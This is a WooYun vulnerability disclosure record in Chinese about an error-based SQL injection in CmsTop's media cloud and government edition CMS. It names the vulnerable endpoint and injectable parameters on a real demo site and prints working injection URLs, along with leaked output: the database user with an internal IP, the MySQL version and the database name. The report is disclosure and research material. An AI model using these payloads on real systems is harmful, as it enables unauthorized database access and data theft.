{"id": 73800, "wybug_id": "wooyun-2015-0151457", "wybug_title": "CmsTop媒体云&amp;政务版SQL报错注入漏洞（XPATH）", "wybug_corp": "CmsTop", "wybug_author": "路人甲", "wybug_date": "2015-11-03 11:22", "wybug_open_date": "2016-02-06 11:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-08：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向公众公开  简要描述： RT多个参数存在隐患注入比较隐蔽~ 详细说明：  CMSTOP比较难挖 WooYun: CMSTOP媒体云&政务版SQL报错注入漏洞（XPATH） 厂商官网：http://www.cmstop.com/产品涉及：\nCmsTop 媒体版面向媒体提供“PC站＋手机站＋手机端＋平板端”多终端一体化新媒体技术解决方案，助力媒体融合转型。媒体云CmsTop 媒体云作为媒体云时代的开创者，思拓合众颠覆了传统的软件采购和项目外包模式，与传媒集团建立战略合作伙伴关系，以互联网思维和云计算技术为基础整合集团、区域和行业内的媒体及政务新媒体资源，共同建设和运营媒体云。政务版CmsTop 政务版面向党政部门提供多终端一体化的网站群私有云技术解决方案，助力党政部门打造“两微一端”政务新媒体。\n在线演示站点：\nhttp://www.cmstop.cn/\n这处SQL出在上传附件处。。。第一步，需要注册，内部子项功能比较多\n\n然后就找到某子项，上传附件处，抓包正常数据包：\n\n注入地址：\nhttp://site.cmstop.cn/system/attachment/thumblist?tags=&offset=0&size=35&width=250&height=100\n多个参数可注入，如：tags、size、width、height开发测试可能忽略了这一处\n\n证明其中一个参数随便挑一个参数：width提交：\nhttp://site.cmstop.cn/system/attachment/thumblist?tags=&offset=0&size=35&width=250  AND (SELECT 1 FROM (SELECT COUNT(Table_name),CONCAT(user(),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a)&height=100\n\n\n注出用户：\nsite_11701@10.162.64.228\n再注一下版本：\nhttp://site.cmstop.cn/system/attachment/thumblist?tags=&offset=0&size=35&width=250  AND (SELECT 1 FROM (SELECT COUNT(Table_name),CONCAT(version(),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a)&height=100\n\n\n版本：\n5.6.20-log\n被前人找到漏洞以后厂商进行了相关修复，把一些配置信息改了\nhttp://site.cmstop.cn/system/attachment/thumblist?tags=&offset=0&size=35&width=250  AND (SELECT 1 FROM (SELECT COUNT(Table_name),CONCAT(version(),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a)&height=100\n\n\n数据库名被改为：\nsite_MDAwMDExN1zAx1\n   漏洞证明：  已证明   修复方案：  再过滤一次吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-06 11:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}